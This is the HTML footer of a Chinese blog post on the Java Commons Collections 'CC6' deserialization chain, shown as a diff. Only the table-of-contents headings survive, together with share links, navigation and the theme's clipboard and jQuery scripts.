+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CC6%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-number">1.</span> <span class="toc-text">CC6调用链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#TiedMapEntry-getvalue%E7%9A%84%E8%B0%83%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text">TiedMapEntry#getvalue的调用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TiedMapEntry-hashcode"><span class="toc-number">1.2.</span> <span class="toc-text">TiedMapEntry#hashcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HashMap-hashcode"><span class="toc-number">1.3.</span> <span class="toc-text">HashMap#hashcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3hash-%E6%96%B9%E6%B3%95%E6%8F%90%E5%89%8D%E8%A7%A6%E5%8F%91"><span class="toc-number">1.4.</span> <span class="toc-text">解决hash()方法提前触发</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://dgxddd.github.io/2024/04/01/CC6/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://dgxddd.github.io/2024/04/01/CC6/&text=CC6"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://dgxddd.github.io/2024/04/01/CC6/&title=CC6"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://dgxddd.github.io/2024/04/01/CC6/&is_video=false&description=CC6"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CC6&body=Check out this article: https://dgxddd.github.io/2024/04/01/CC6/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://dgxddd.github.io/2024/04/01/CC6/&title=CC6"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://dgxddd.github.io/2024/04/01/CC6/&title=CC6"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://dgxddd.github.io/2024/04/01/CC6/&title=CC6"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://dgxddd.github.io/2024/04/01/CC6/&title=CC6"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://dgxddd.github.io/2024/04/01/CC6/&name=CC6&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://dgxddd.github.io/2024/04/01/CC6/&t=CC6"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    jxdgx
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+<link rel="stylesheet" href="/css/custom.css">
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<script src="/js/custom.js"></script>
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
